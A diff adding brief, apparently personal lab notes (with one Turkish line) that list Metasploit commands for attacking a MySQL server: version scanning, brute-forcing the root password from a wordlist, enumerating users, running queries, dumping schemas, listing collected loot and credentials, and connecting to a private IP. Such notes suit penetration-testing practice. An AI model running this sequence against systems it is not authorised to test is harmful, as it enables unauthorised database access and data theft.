@@ -1,0 +1,39 @@
+msfconsole
+
+workspace -a mysql_enum
+
+setg RHOSTS
+
+auxiliary/scanner/mysql/mysql_version
+
+auxiliary/scanner/mysql/mysql_login
+set USER root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+
+auxiliary/admin/mysql/mysql_enum
+set USERNAME
+set PASSWORD
+
+auxiliary/admin/mysql/mysql_sql
+set USERNAME
+set PASSWORD
+set SQL select version()
+set SQL show databases;
+set SQL use videos;
+
+auxiliary/scanner/mysql/mysql_schemadump
+set PASSWORD
+set USERNAME
+
+Bulduklarimizi goruntulemek icin
+
+hosts
+services
+loot
+creds
+
+
+mysql -h 192.168.100.55 -u root -p
+show databases;
+
